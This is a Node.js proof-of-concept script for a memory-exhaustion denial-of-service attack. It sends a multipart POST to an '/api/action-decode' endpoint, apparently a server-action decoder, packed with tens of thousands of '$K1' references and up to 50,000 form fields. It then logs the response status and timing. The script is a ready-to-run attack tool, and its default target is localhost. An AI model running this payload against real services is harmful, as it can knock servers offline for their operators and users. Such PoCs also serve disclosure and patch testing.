#!/usr/bin/env node
"use strict";

/*
   _____              .___                       _____         .__                   __
  /  _  \   ____    __| _/______   ______  _  __/     \   ____ |  |__ _____ __  _  _|  | __
 /  /_\  \ /    \  / __ |\_  __ \_/ __ \ \/ \/ /  \ /  \ /  _ \|  |  \\__  \\ \/ \/ /  |/ /
/    |    \   |  \/ /_/ | |  | \/\  ___/\     /    Y    (  <_> )   Y  \/ __ \\     /|    <
\____|__  /___|  /\____ | |__|    \___  >\/\_/\____|__  /\____/|___|  (____  /\/\_/ |__|_ \
        \/     \/      \/             \/              \/            \/     \/            \/
MaltegoIsNotAChicken
6tL"BDImisFCe9WEccS+Bl.D
*/

const crypto = require("crypto");

function usage() {
  console.error("Usage: node poc-k-map-memory-pressure.js [target] [refs] [fields]");
  console.error("Example: node poc-k-map-memory-pressure.js http://127.0.0.1:3000/api/action-decode 25000 50000");
}

function toInt(value, fallback, name) {
  const n = Number.parseInt(value ?? "", 10);
  if (Number.isFinite(n) && n > 0) return n;
  if (fallback !== undefined) return fallback;
  throw new Error(`Invalid ${name}: ${value}`);
}

function normalizeTarget(input) {
  const raw = input || "http://127.0.0.1:3000/api/action-decode";
  const url = new URL(raw.startsWith("http") ? raw : `http://${raw}`);
  if (url.pathname === "/") url.pathname = "/api/action-decode";
  return url.toString();
}

function buildMultipart(parts) {
  const boundary = `----poc-k-oom-${crypto.randomBytes(6).toString("hex")}`;
  const chunks = [];
  for (const { name, value } of parts) {
    chunks.push(`--${boundary}\r\n`);
    chunks.push(`Content-Disposition: form-data; name=\"${name}\"\r\n\r\n`);
    chunks.push(String(value));
    chunks.push("\r\n");
  }
  chunks.push(`--${boundary}--\r\n`);
  const body = chunks.join("");
  return { boundary, body };
}

async function main() {
  if (process.argv.includes("--help") || process.argv.includes("-h")) {
    usage();
    process.exit(0);
  }

  if (typeof fetch !== "function") {
    throw new Error("Node.js 18+ is required (global fetch).");
  }

  const target = normalizeTarget(process.argv[2]);
  const refs = toInt(process.argv[3], 25000, "refs");
  const fields = toInt(process.argv[4], 50000, "fields");

  const model = JSON.stringify(Array.from({ length: refs }, () => "$K1"));
  const parts = [];
  for (let i = 0; i < fields; i += 1) {
    parts.push({ name: `1_f${i}`, value: "x" });
  }
  parts.push({ name: "0", value: model });

  const { boundary, body } = buildMultipart(parts);
  const started = Date.now();
  const res = await fetch(target, {
    method: "POST",
    headers: {
      "Content-Type": `multipart/form-data; boundary=${boundary}`,
    },
    body,
  });

  const elapsedMs = Date.now() - started;
  console.log(
    JSON.stringify(
      {
        target,
        refs,
        fields,
        payloadBytes: Buffer.byteLength(body),
        status: res.status,
        elapsedMs,
      },
      null,
      2
    )
  );
}

main().catch((err) => {
  console.error(err.message || err);
  process.exit(1);
});
